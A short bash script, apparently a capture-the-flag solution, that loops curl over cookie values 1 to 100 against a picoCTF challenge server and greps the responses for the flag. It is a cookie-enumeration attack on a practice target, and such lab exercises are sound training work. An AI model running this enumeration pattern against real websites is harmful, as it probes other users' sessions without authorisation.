for i in {1..100}; do
	curl -s -H "Cookie: name=${i}" -L http://wily-courier.picoctf.net:52833/ | grep -o picoCTF{.*}
done
